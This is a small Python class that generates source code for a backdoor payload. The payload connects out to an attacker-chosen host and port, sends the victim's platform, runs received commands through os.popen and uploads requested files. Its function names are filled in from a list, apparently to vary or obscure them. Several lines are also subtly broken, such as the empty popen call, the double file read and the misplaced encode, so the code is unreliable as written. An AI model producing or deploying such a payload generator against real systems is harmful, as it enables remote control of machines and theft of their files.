class Payload:
    def __init__(self, host: str, port: int, strs: list):
        self.host, self.port, self.strs = host, port, strs

    def create(self):
        return f"""
def {self.strs[0]}(file, conn):\n\tconn.send("!!!".encode("UTF-8"))
\twith open(file , 'rb') as f:
\t\tconn.send(str(len(f.read())).encode("UTF-8"))\n\t\tconn.send(f.read())
\t\tconn.send(file.strip(os.path.dirname(file))).encode("UTF-8")
{self.strs[1]} = False
while not {self.strs[1]}:\n\ttry:\n\t\tconn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
\t\tconn.connect(('{self.host}', {self.port}))
\t\t{self.strs[1]} = True
\texcept:\n\t\t{self.strs[1]} = False\n\telse:\n\t\tconn.send((sys.platform).encode("UTF-8"))
while {self.strs[1]}:\n\t\ttry:
\t\t\tc = conn.recv(1024).decode("UTF-8")
\t\t\tif c.startswith("!!!"):{self.strs[0]}(c.strip('!!!'), conn)
\t\t\telse : conn.send(os.popen().read().encode("UTF-8"))\n\t\texcept:\n\t\t\t{self.strs[0]} = False
"""
